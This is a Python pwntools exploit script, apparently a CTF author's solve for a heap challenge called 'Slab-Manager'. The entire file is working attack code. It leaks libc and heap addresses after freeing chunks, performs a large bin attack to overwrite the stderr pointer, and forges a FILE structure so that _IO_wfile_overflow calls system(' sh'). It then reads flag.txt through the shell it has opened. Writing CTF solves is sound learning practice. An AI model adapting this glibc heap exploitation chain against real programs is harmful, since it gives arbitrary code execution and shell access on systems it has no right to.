#!/usr/bin/env python3

from pwn import *

PATH = "/home/spinel99/CTFs/Author/HackingHub/SnykCTF/pwn/Slab-Manager/solve/chall"
LIBC_PATH = "/home/spinel99/CTFs/Author/HackingHub/SnykCTF/pwn/Slab-Manager/solve/libc.so.6"
LD_PATH = "/home/spinel99/CTFs/Author/HackingHub/SnykCTF/pwn/Slab-Manager/solve/ld-linux-x86-64.so.2"

exe = context.binary = ELF(PATH, checksec=False)
libc = ELF(LIBC_PATH, checksec=False)
ldd = ELF(LD_PATH, checksec=False)

def createSlab(p: process|remote, idx: int, size: int):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Enter index of slab: ', str(idx).encode())
    p.sendlineafter(b'Enter size of slab: ', str(size).encode())
    p.recvuntil(b'Slab created successfully.\n')

def readSlab(p: process|remote, idx: int) -> bytes:
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Enter index of slab: ', str(idx).encode())
    p.recvuntil(b'Content of Slab:\n')
    data = p.recvuntil(b'What will you chose today?', drop=True)
    return data

def writeSlab(p: process|remote, idx: int, data: bytes):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Enter index of slab: ', str(idx).encode())
    p.send(data)
    p.recvuntil(b'Slab written successfully.\n')

def deleteSlab(p: process|remote, idx: int):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'Enter index of slab: ', str(idx).encode())
    p.recvuntil(b'Slab deleted successfully.\n')

if args.REMOTE:
    HOST = "localhost"
    PORT = 10000
    p = remote(HOST, PORT)
else:
    p = process(PATH)
    if args.GDB:
        GDB_SCRIPT = \
"""
b *0x401496
b *0x4016E2
b *0x4017E1
b *0x4018ce
b *_IO_wfile_overflow

c
"""
        # gdb.attach(p, gdbscript=GDB_SCRIPT)

# Leaking environment
createSlab(p, 0, 0x600)
createSlab(p, 15, 0x500) # guard
createSlab(p, 1, 0x600)
createSlab(p, 14, 0x500) # guard

writeSlab(p, 0, cyclic(0x20, n=8))

deleteSlab(p, 0)

deleteSlab(p, 1)

# cleaning up heap
createSlab(p, 13, 0x600)
createSlab(p, 12, 0x600)

leak = readSlab(p, 0)
libc.address = u64(leak[0x00:0x08]) - 0x21ace0
heap_base = u64(leak[0x08:0x10]) - 0xdb0

print(f'libc.address: {hex(libc.address)}')
print(f'heap_base: {hex(heap_base)}')

# Starting large bin attack
createSlab(p, 2, 0x810) # p1
createSlab(p, 11, 0x508) # guard
createSlab(p, 3, 0x800) # p2
createSlab(p, 10, 0x500) # guard

deleteSlab(p, 2)

createSlab(p, 4, 0x820) # g3

deleteSlab(p, 3)

s = b''
s += p64(libc.address + 0x21b1d0)
s += p64(libc.address + 0x21b1d0)
s += p64(heap_base + 0x18d0)
s += p64(0x404040 - 0x20) # stderr@GLIBC_2.2.5 - 0x20

writeSlab(p, 2, s)

createSlab(p, 5, 0x820) # stderr@GLIBC_2.2.5 <- slabs[3] - 0x10 
writeSlab(p, 11, b'\x00' * 0x500 + b' sh'.ljust(8, b'\x00')) # Set up ' sh' at start of next chunk

# FSOP to overwrite stderr.vtable->__xsputn with _IO_wfile_overflow to system(" sh")
fs_addr = heap_base + 0x2600
w_addr = fs_addr + 0xE0
w_vtable_addr = w_addr
w_offset = 0xE0

fs = flat(
	{
        0x88: p64(libc.sym['_IO_stdfile_2_lock']),
		0xA0: p64(w_addr),
		0xC0: p32(-1, sign="signed"),
		0xD8: libc.sym['_IO_wfile_jumps'] - 0x38 + 0x18,
		w_offset+0xE0: p64(w_vtable_addr),
		w_offset+0x68: p64(libc.sym['system'])
	},
	filler=b'\x00'
)

writeSlab(p, 3, fs[0x10:])

if args.GDB:
    gdb.attach(p, gdbscript=GDB_SCRIPT)

p.sendlineafter(b'> ', b'8')

p.sendline(b'cat flag.txt')

p.interactive()